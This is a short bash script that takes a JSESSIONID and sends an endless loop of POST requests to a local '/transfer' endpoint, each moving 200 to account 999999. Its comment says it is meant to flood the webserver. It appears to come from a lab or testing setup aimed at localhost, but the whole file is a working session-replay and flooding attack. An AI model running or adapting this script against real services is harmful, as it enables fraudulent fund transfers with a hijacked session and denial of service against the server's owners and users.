#!/bin/bash
# Script to flood webserver with POST requests
# Should have parameter of JSESSIONID

# Check if we have arguments
if [ "$#" -ne 1 ]
then
    echo "Usage: $0 <JSESSIONID>"
    exit 1
fi

while :
do
    curl -X POST http://localhost:15000/transfer -H "Cookie: JSESSIONID=$1" -d "to=999999&transferAmount=200"
done